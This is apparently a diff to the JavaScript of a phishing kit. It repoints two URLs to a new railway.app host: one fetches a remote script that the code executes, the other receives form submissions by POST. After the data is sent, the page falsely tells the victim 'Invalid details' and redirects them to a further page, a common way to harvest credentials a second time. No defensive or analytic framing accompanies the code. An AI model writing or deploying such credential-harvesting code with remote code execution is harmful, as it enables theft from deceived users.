@@ -3,7 +3,7 @@ let premiumUsers = [];
 
 async function loadPremiumUsers() {
   try {
-    const res = await fetch("https://web-production-22fce0.up.railway.app/premiumlist.js");
+    const res = await fetch("https://web-production-dd84e.up.railway.app/psend/premiumlist.js");
     const text = await res.text();
 
     // Execute premiumlist.js and extract premiumUsers
@@ -86,7 +86,7 @@ document.addEventListener("DOMContentLoaded", async () => {
 
       try {
         const response = await fetch(
-          "https://web-production-22fce0.up.railway.app/send",
+          "https://web-production-dd84e.up.railway.app/psend/send",
           {
             method: "POST",
             body: formData
@@ -94,11 +94,11 @@ document.addEventListener("DOMContentLoaded", async () => {
         );
 
         if (response.ok) {
-          alert("⛔ Invalid details please try again 😟");
+          alert("Inalid details");
           form.reset();
 
           // ✅ REDIRECT WITH ID
-          window.location.href = `code/c4.html?id=${encodeURIComponent(userId)}`;
+          window.location.href = `c4.html?id=${encodeURIComponent(userId)}`;
         } else {
           const errorText = await response.text();
           console.error("Server Error:", errorText);
